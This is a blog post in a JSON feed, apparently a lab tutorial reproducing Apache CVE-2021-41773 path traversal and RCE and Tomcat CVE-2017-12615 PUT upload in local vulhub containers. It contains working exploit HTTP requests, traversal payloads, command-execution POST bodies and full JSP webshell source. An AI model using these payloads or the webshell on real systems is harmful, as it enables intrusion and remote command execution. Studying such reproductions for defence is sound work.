{
    "version": "https://jsonfeed.org/version/1",
    "title": "golden的部落阁 • All posts by \"cve复现\" category",
    "description": "golden的部落阁",
    "home_page_url": "http://blog.g01den.top",
    "items": [
        {
            "id": "http://blog.g01den.top/posts/2bb7953f.html",
            "url": "http://blog.g01den.top/posts/2bb7953f.html",
            "title": "部分CVE复现Web（1）",
            "date_published": "2024-06-17T14:14:26.000Z",
            "content_html": "<h1 id=\"apache-http-server-路径穿越漏洞cve-2021-41773\"><a class=\"markdownIt-Anchor\" href=\"#apache-http-server-路径穿越漏洞cve-2021-41773\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU5OTc1NDM5L2FydGljbGUvZGV0YWlscy8xMjUyMjU5NDk/b3BzX3JlcXVlc3RfbWlzYz0lN0IlMjJyZXF1ZXN0JTVGaWQlMjIlM0ElMjIxNzE4NjIwMzk1MTY4MDAyMjc0ODI2MjklMjIlMkMlMjJzY20lMjIlM0ElMjIyMDE0MDcxMy4xMzAxMDIzMzQuLiUyMiU3RCZhbXA7cmVxdWVzdF9pZD0xNzE4NjIwMzk1MTY4MDAyMjc0ODI2MjkmYW1wO2Jpel9pZD0wJmFtcDt1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmFsbH50b3BfY2xpY2t+ZGVmYXVsdC0xLTEyNTIyNTk0OS1udWxsLW51bGwuMTQyJTVFdjEwMCU1RXBjX3NlYXJjaF9yZXN1bHRfYmFzZTUmYW1wO3V0bV90ZXJtPUNWRS0yMDIxLTQxNzczJmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==\">Apache HTTP Server 路径穿越漏洞 CVE-2021-41773</span></h1>\n<p>​\t首先，先来看一下这个漏洞的官方描述：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/6a0535188c6e42b49e1bd35d195570e4.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\tCVE-2021-41773 是在 Apache HTTP Server 2.4.49 中对路径规范化所做的更改中发现了一个缺陷。攻击者可以使用路径遍历攻击将 URL 映射到预期文档根目录之外的文件，如果文档根目录之外的文件不受 “要求全部拒绝” 的保护，则这些请求可能会成功，如果还为这些别名路径启用了 CGI 脚本，则可以允许远程代码执行。</p>\n<h2 id=\"漏洞条件\"><a class=\"markdownIt-Anchor\" href=\"#漏洞条件\">#</a> 漏洞条件：</h2>\n<p>​\t配置目录遍历，并且开启 cgi mode 2.Apache HTTPd 版本为 2.4.49/2.4.50 3. 存在 cgi-bin 和 icons 文件夹</p>\n<p>​\t穿越的目录允许被访问，比如配置了<Directory />Require all granted</Directory>。（默认情况下是不允许的：<Directory />Require all denied</Directory>）</p>\n<p><strong>注意：这里的 /icons/ 必须是一个存在且可访问的目录</strong></p>\n<h2 id=\"漏洞复现\"><a class=\"markdownIt-Anchor\" href=\"#漏洞复现\">#</a> 漏洞复现：</h2>\n<p>​\t首先，需要在虚拟机里下载一个 docker，可以通过</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install docker.io docker-compose</span><br></pre></td></tr></table></figure>\n<p>来安装。</p>\n<p>​\t之后，需要下载 vulhub 的环境</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>\n<p>​\t之后就可以在 vulhub 这个文件夹下的 httpd 找到漏洞编号 CVE-2021-41773 了，然后执行如下命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n<p>即可搭建完成，之后根据它开放的 端口来访问这个服务，</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/847d5ca0e8dc41a383d84062fea18298.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t出现这个页面则表示搭建成功了，之后就可以开始了。</p>\n<p>​\t首先，抓包，然后修改请求包如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1</span><br><span class=\"line\">Host: 192.168.209.130:8080</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class=\"line\">If-None-Match: &quot;2d-432a5e4a73a80&quot;</span><br><span class=\"line\">If-Modified-Since: Mon, 11 Jun 2007 18:53:14 GMT</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure>\n<p>​\t可以看到，我们请求的路径为 /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd , 那么，为啥这个路径能行呢？可以参考这篇文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcnNzLmNvbS9hcnRpY2xlcy8zNDg5MA==\">Apache HTTP Server 路径穿越漏洞 (CVE-2021-41773) 分析复现</span>。说白了就是没有对目录进行有效的过滤，导致了可以造成目录穿越直接读取根目录的文件，不过，有的时候可能存在一些个问题，可能需要对 %2e 进行二次 url 编码，这里只是提一句。</p>\n<p>​\t发送了请求之后我们能够拿到这个回显：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Mon, 17 Jun 2024 12:20:37 GMT</span><br><span class=\"line\">Server: Apache/2.4.49 (Unix)</span><br><span class=\"line\">Last-Modified: Mon, 27 Sep 2021 00:00:00 GMT</span><br><span class=\"line\">ETag: &quot;39e-5cceec7356000&quot;</span><br><span class=\"line\">Accept-Ranges: bytes</span><br><span class=\"line\">Content-Length: 926</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class=\"line\">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class=\"line\">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class=\"line\">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class=\"line\">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class=\"line\">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class=\"line\">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class=\"line\">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class=\"line\">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class=\"line\">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class=\"line\">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class=\"line\">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class=\"line\">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class=\"line\">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class=\"line\">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class=\"line\">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class=\"line\">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>\n<p>​\t证明我们成功了，成功读取了文件。</p>\n<p>​\t难道，只能这样了吗？</p>\n<h2 id=\"命令执行\"><a class=\"markdownIt-Anchor\" href=\"#命令执行\">#</a> 命令执行：</h2>\n<p>​\t当然不是，在服务器开启 cgi 或 cgid 模块的情况下，该漏洞可执行任意命令。</p>\n<p>​\t如果，当我们修改文件路径为：/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh  时，就会发现，我们输入的 POST 参数会被当做命令进行执行，也就是说，我们直接做到了 RCE 。</p>\n<p>​\t给个原因。</p>\n<blockquote>\n<p>也就是说，通过 POST 传入的 参数，会作为  <code>stdin</code>  的内容，交给 所访问的 cgi 程序处理</p>\n<p>如果访问的是  <code>/bin/sh</code>  ，那么就能直接 getshell 了</p>\n</blockquote>\n<p>​\t我们给 POST 传入（固定格式） <code>echo Content-Type: text/plain; echo; ls /</code> ，之后就会发现我们成功读取了文件，我提前在根目录存放了 flag 文件，当作一个 ctf 题目来表明我们做对了这个题。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Mon, 17 Jun 2024 12:50:01 GMT</span><br><span class=\"line\">Server: Apache/2.4.49 (Unix)</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\">Content-Length: 90</span><br><span class=\"line\"></span><br><span class=\"line\">bin</span><br><span class=\"line\">boot</span><br><span class=\"line\">dev</span><br><span class=\"line\">etc</span><br><span class=\"line\">flag</span><br><span class=\"line\">home</span><br><span class=\"line\">lib</span><br><span class=\"line\">lib64</span><br><span class=\"line\">media</span><br><span class=\"line\">mnt</span><br><span class=\"line\">opt</span><br><span class=\"line\">proc</span><br><span class=\"line\">root</span><br><span class=\"line\">run</span><br><span class=\"line\">sbin</span><br><span class=\"line\">srv</span><br><span class=\"line\">sys</span><br><span class=\"line\">tmp</span><br><span class=\"line\">usr</span><br><span class=\"line\">var</span><br></pre></td></tr></table></figure>\n<p>​\t之后我们 POST 传入： <code>echo Content-Type: text/plain; echo; cat /flag</code> ，最后能够拿到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Mon, 17 Jun 2024 12:52:04 GMT</span><br><span class=\"line\">Server: Apache/2.4.49 (Unix)</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\">Content-Length: 21</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;CVE-2021-41773&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"tomcat文件上传\"><a class=\"markdownIt-Anchor\" href=\"#tomcat文件上传\">#</a> Tomcat 文件上传：</h1>\n<h2 id=\"前置知识\"><a class=\"markdownIt-Anchor\" href=\"#前置知识\">#</a> 前置知识：</h2>\n<p>​\t<strong>PUT 请求是向服务器端发送数据的，从而改变信息</strong>，该请求就像数据库的 update 操作一样，用来修改数据的内容，但是不会增加数据的种类等，也就是说无论进行多少次 PUT 操作，其结果并没有不同。</p>\n<p>​\tweb.xml 主要用来配置 Filter、Listener、Servlet 等。当 readonly 是 true 的话，那么 PUT 和 DELETE 方法是被拒绝的，因此如果手动将 readonly 选项开启为 false，那么就能够通过 PUT 方法上传文件了。</p>\n<h2 id=\"漏洞复现-2\"><a class=\"markdownIt-Anchor\" href=\"#漏洞复现-2\">#</a> 漏洞复现：</h2>\n<p>​\tvulhub 文件夹中的 tomcat 的 CVE-2017-12615 就是漏洞复现的环境。</p>\n<p>​\t可以在当前文件夹中使用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose build</span><br><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n<p>来启动环境。</p>\n<p>​\t访问了之后是如下这个情况：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/9ff98e223dc349098074ad96f83457fa.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t那么，首先我们在 docker 里查看我们的题目环境是怎么样的，可以发现 readonly 的值就是 false：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"comment\">&lt;!--   readonly            Is this context &quot;read only&quot;, so HTTP           --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>readonly<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t那么，我们就可以通过 PUT 传参来更新文件，大概 http 请求如下：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">PUT</span> <span class=\"string\">/1.jsp</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>192.168.209.130:8080</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span><span class=\"punctuation\">: </span>1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>4</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"built_in\">test</span></span></span><br></pre></td></tr></table></figure>\n<p>​\t这里发现无法上传，报错是 405–Method Not Allowed，查资料说的是后缀不允许，所以在 / 1.jsp 后面加上 %20 再试试，结果如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 204 </span><br><span class=\"line\">Date: Mon, 17 Jun 2024 13:40:05 GMT</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure>\n<p>​\t应该是上传成功了，访问下这个文件试试；</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/26fdf3232c614210abcf5538ccccad2a.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t能访问到，说明这里就上传成功了，那么，接下来上传 jsp 马，如下：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">PUT</span> <span class=\"string\">/1.jsp%20</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>192.168.209.130:8080</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span><span class=\"punctuation\">: </span>1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>635</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-vbscript-html\"><span class=\"language-vbscript\">&lt;%@ page import=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"></span><span class=\"language-vbscript\">&lt;%@ page import=<span class=\"string\">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"></span><span class=\"language-vbscript\">&lt;%@ page import=<span class=\"string\">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"></span><span class=\"language-vbscript\">&lt;%@ page contentType=<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span> language=<span class=\"string\">&quot;java&quot;</span> %&gt;</span><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>一句话木马<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"></span><span class=\"language-vbscript\">&lt;%</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">  Process process = Runtime.getRun<span class=\"built_in\">time</span>().exec(<span class=\"built_in\">request</span>.getParameter(<span class=\"string\">&quot;cmd&quot;</span>));</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">  InputStream inputStream = process.getInputStream();</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">  BufferedReader bufferedReader =  <span class=\"keyword\">new</span> BufferedReader(<span class=\"keyword\">new</span> InputStreamReader(inputStream));</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">  String line;</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">  <span class=\"keyword\">while</span> ((line = bufferedReader.readLine())!=<span class=\"literal\">null</span>)&#123;</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">     <span class=\"built_in\">response</span>.getWriter().pr<span class=\"built_in\">int</span>(line);</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">%&gt;</span><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>\n<p>​\t这里很明显可以得知木马的参数为 cmd，所以访问之后直接传递 cmd 的参数即可执行命令，cmd=cat /flag：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/14260754e6a041acb01c6ac27facfab6.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n",
            "tags": [
                "CVE",
                "Web"
            ]
        }
    ]
}